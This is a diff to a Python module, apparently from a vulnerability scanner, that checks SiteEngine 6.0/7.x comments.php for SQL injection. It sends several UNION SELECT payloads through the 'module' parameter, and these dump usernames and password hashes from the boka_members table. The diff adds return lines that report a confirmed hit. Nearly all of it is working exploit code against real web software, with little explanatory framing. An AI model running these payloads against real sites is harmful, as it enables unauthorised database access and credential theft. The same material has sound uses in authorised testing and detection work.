@@ -27,18 +27,22 @@ class siteengine_comments_module_sqli_BaseVerify:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                 cprint("[+]存在SiteEngine6.0 comments.php SQL注入漏洞...(高危)\tpayload: "+vulnurl, "red")
+                return True, vulnurl, "SiteEngine 6.0 & 7.1 SQL注入漏洞", str(payload), req.text
             vulnurl = self.url + "/comments.php?id=1&module=newstopic+m,boka_newstopicclass+c+WhEre+1=2+UniOn+sElEct+1,2,Group_Concat(username, 0x7e, password, Md5(1234), 0x7e),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39+From+boka_members%23"
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                 cprint("[+]存在SiteEngine7.0 comments.php SQL注入漏洞...(高危)\tpayload: "+vulnurl, "red")
+                return True, vulnurl, "SiteEngine 6.0 & 7.1 SQL注入漏洞", str(payload), req.text
             vulnurl = self.url + "/comments.php?id=1&module=newstopic+m,boka_newstopicclass+c+WhEre+1=2+UniOn+sElEct+1,2,Group_Concat(username, 0x7e, password, Md5(1234), 0x7e),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27+From+boka_members%23"
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                 cprint("[+]存在SiteEngine7.0 comments.php SQL注入漏洞...(高危)\tpayload: "+vulnurl, "red")
+                return True, vulnurl, "SiteEngine 6.0 & 7.1 SQL注入漏洞", str(payload), req.text
             vulnurl = self.url + "/comments.php?id=1&module=newstopic+m,boka_newstopicclass+c+WhEre+1=2+UniOn+sElEct+1,2,Group_Concat(username, 0x7e, password, Md5(1234), 0x7e),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38+From+boka_members%23"
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                 cprint("[+]存在SiteEngine7.0 comments.php SQL注入漏洞...(高危)\tpayload: "+vulnurl, "red")
+                return True, vulnurl, "SiteEngine 6.0 & 7.1 SQL注入漏洞", str(payload), req.text
             else:
                 cprint("[-]不存在siteengine_comments_module_sqli漏洞", "white", "on_grey")
                 return False, None, None, None, None
